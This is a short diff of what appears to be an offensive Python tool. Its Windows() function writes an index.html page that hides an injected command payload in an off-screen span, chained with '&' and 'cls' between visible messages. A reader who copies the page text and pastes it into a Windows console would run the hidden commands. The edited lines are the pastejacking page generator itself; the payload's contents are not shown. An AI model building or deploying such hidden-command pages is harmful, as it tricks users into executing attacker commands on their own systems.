@@ -66,8 +66,10 @@ def Windows():
     index = "index.html"
     job = open(index, "w")
     job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """ +
-              out+""" & c:\ & cls <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p> """)
+          out.decode('utf-8') +""" & c:\ & cls <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p> """)
     job.close()
+
+
 
     print('\033[1;31m'+"""\n-------------------------------------------------------------------
  -> Payload, mensajes y comandos injectados en index.html""")
